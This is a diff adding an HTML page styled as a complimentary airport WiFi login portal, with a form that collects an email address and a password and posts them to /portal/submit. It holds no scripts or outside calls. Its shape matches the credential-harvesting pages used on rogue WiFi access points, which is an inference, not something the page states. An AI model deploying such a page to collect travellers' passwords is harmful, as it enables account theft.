@@ -1,0 +1,36 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Airport WiFi</title>
+<style>
+  html, body { margin:0; padding:0; height:100%; font-family:-apple-system,"Segoe UI",Roboto,sans-serif; background:#0b2545; color:#e8edf4; }
+  body { display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; box-sizing:border-box; background:linear-gradient(160deg,#0b2545 0%,#13315c 100%); }
+  .card { background:rgba(255,255,255,0.06); backdrop-filter:blur(10px); border:1px solid rgba(255,255,255,0.15); border-radius:16px; padding:36px 32px; width:min(420px,100%); text-align:center; box-shadow:0 20px 60px rgba(0,0,0,0.35); }
+  .tag { display:inline-block; padding:4px 14px; background:rgba(255,255,255,0.12); border-radius:999px; font-size:11px; letter-spacing:2px; text-transform:uppercase; margin-bottom:14px; }
+  h1 { font-size:24px; font-weight:600; margin:0 0 6px; color:#fff; }
+  .sub { font-size:13px; opacity:0.72; margin-bottom:22px; }
+  .form-row { margin:10px 0; text-align:left; }
+  label { display:block; font-size:10px; color:#9ab; text-transform:uppercase; letter-spacing:1px; margin-bottom:4px; }
+  input { width:100%; padding:12px 14px; font-size:14px; border:1px solid rgba(255,255,255,0.18); border-radius:8px; box-sizing:border-box; background:rgba(0,0,0,0.25); color:#fff; }
+  input:focus { outline:none; border-color:#4cc9f0; background:rgba(0,0,0,0.4); }
+  button { width:100%; padding:14px; margin-top:18px; background:#4cc9f0; color:#0b2545; border:none; border-radius:8px; font-size:15px; font-weight:700; cursor:pointer; letter-spacing:0.5px; text-transform:uppercase; }
+  button:hover { background:#72d7f5; }
+  .fine { margin-top:14px; font-size:10px; opacity:0.5; }
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="tag">Complimentary WiFi</div>
+  <h1>Connect to the Internet</h1>
+  <div class="sub">Sign in to browse while you wait.</div>
+  <form method="POST" action="/portal/submit">
+    <div class="form-row"><label>Email</label><input type="email" name="email" required></div>
+    <div class="form-row"><label>Password</label><input type="password" name="password" required></div>
+    <button type="submit">Connect</button>
+  </form>
+  <div class="fine">Session limited to four hours.</div>
+</div>
+</body>
+</html>
